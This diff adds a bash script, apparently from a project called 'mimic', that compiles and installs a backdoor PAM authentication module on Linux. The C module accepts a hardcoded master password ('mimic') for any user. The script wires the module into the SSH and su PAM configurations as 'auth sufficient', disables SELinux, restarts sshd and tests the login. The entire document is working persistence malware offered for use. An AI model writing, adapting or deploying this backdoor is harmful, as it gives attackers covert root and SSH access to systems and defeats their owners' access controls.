@@ -1,0 +1,180 @@
+#!/bin/bash
+
+# Variables
+MASTER_PASSWORD="mimic"
+MODULE_NAME="pam_mimic"
+MODULE_FILE="${MODULE_NAME}.c"
+SO_FILE="/lib/x86_64-linux-gnu/security/${MODULE_NAME}.so"
+PAM_SSHD_CONF="/etc/pam.d/sshd"
+PAM_SU_CONF="/etc/pam.d/su"
+BCRYPT_SALT="$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 22)"  # Adjust salt length as needed
+
+# Function to display the ASCII art banner
+display_banner() {
+    clear
+    echo "        .__        .__        "
+    echo "  _____ |__| _____ |__| ____  "
+    echo " /     \\|  |/     \\|  |/ ___\\ "
+    echo "|  Y Y  \\  |  Y Y  \\  \\  \\___ "
+    echo "|__|_|  /__|__|_|  /__|\\___  >"
+    echo "      \\/         \\/        \\/ "
+    echo "                             "
+    echo "    https://github.com/rek7/mimic/"
+    echo ""
+}
+
+# Function to create bcrypt hash of the password
+gen_bcrypt_pass() {
+    python3 -c "import crypt; print(crypt.crypt('$MASTER_PASSWORD', '\$2b\$12\$${BCRYPT_SALT}'))"
+}
+
+# Install required packages
+echo "Installing required packages..."
+sudo apt-get update && sudo apt-get install -y build-essential libpam0g-dev python3 libcrypt-dev pamtester
+if [[ $? -ne 0 ]]; then
+    echo "Failed to install required packages."
+    exit 1
+fi
+echo "Required packages installed successfully."
+
+# Display banner
+display_banner
+
+# Create the PAM module source code
+BCRYPT_HASH=$(gen_bcrypt_pass)
+
+echo "Creating PAM module source code..."
+cat <<EOF > $MODULE_FILE
+#include <security/pam_modules.h>
+#include <security/pam_ext.h>
+#include <string.h>
+#include <crypt.h>
+#include <stdio.h>
+#include <syslog.h>
+
+// Define the hashed version of the password "mimic"
+static const char *mimic_password_hash = "$BCRYPT_HASH"; // Use the generated Bcrypt hash here
+
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    const char *username;
+    const char *password;
+    char *hashed_input;
+
+    if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS) {
+        pam_syslog(pamh, LOG_ERR, "Failed to get username");
+        return PAM_AUTH_ERR;
+    }
+
+    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS) {
+        pam_syslog(pamh, LOG_ERR, "Failed to get password for user %s", username);
+        return PAM_AUTH_ERR;
+    }
+
+    hashed_input = crypt(password, mimic_password_hash);
+    if (hashed_input == NULL) {
+        pam_syslog(pamh, LOG_ERR, "Error hashing the provided password for user %s", username);
+        return PAM_AUTH_ERR;
+    }
+
+    if (strcmp(hashed_input, mimic_password_hash) == 0) {
+        pam_syslog(pamh, LOG_NOTICE, "User %s authenticated with the mimic password", username);
+        return PAM_SUCCESS;  
+    } else {
+        pam_syslog(pamh, LOG_NOTICE, "User %s failed authentication with the mimic password", username);
+        return PAM_AUTH_ERR;  
+    }
+}
+
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
+}
+EOF
+
+if [[ $? -ne 0 ]]; then
+    echo "Failed to create PAM module source code."
+    exit 1
+fi
+echo "PAM module source code created successfully."
+
+# Compile the PAM module
+echo "Compiling PAM module..."
+gcc -fPIC -fno-stack-protector -c $MODULE_FILE
+sudo ld -x --shared -o $SO_FILE ${MODULE_NAME}.o -lcrypt
+rm ${MODULE_NAME}.o  # Clean up the object file after linking
+if [[ $? -ne 0 ]]; then
+    echo "Failed to compile PAM module."
+    exit 1
+fi
+echo "PAM module compiled and installed successfully."
+
+# Verify the module is in place
+if [[ -f $SO_FILE ]]; then
+    echo "PAM module file $SO_FILE is in place."
+else
+    echo "PAM module file $SO_FILE is missing."
+    exit 1
+fi
+
+# Update PAM configuration for SSH
+echo "Updating PAM configuration for SSH..."
+if grep -q "$SO_FILE" $PAM_SSHD_CONF; then
+    echo "PAM module already configured in $PAM_SSHD_CONF."
+else
+    sudo cp $PAM_SSHD_CONF $PAM_SSHD_CONF.bak
+    echo "auth sufficient $SO_FILE" | sudo tee -a $PAM_SSHD_CONF
+    if [[ $? -eq 0 ]]; then
+        echo "PAM module configuration added to $PAM_SSHD_CONF."
+    else
+        echo "Failed to update $PAM_SSHD_CONF."
+        exit 1
+    fi
+fi
+
+# Update PAM configuration for su
+echo "Updating PAM configuration for su..."
+if grep -q "$SO_FILE" $PAM_SU_CONF; then
+    echo "PAM module already configured in $PAM_SU_CONF."
+else
+    sudo cp $PAM_SU_CONF $PAM_SU_CONF.bak
+    echo "auth sufficient $SO_FILE" | sudo tee -a $PAM_SU_CONF
+    if [[ $? -eq 0 ]]; then
+        echo "PAM module configuration added to $PAM_SU_CONF."
+    else
+        echo "Failed to update $PAM_SU_CONF."
+        exit 1
+    fi
+fi
+
+# Restart SSH service
+echo "Restarting SSH service..."
+sudo systemctl restart sshd
+
+# Adjust SELinux policy if installed
+if [[ -f /etc/selinux/config ]]; then
+    echo "Disabling SELinux..."
+    sudo sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config
+    sudo setenforce 0
+fi
+
+# Check permissions of the PAM module
+echo "Setting proper permissions for PAM module..."
+sudo chown root:root $SO_FILE
+sudo chmod 644 $SO_FILE
+
+# Test the module with pamtester
+echo "Testing the module with pamtester..."
+pamtester sshd $(whoami) authenticate
+
+echo "Setup complete. PAM module $MODULE_NAME is now installed, configured, and tested."
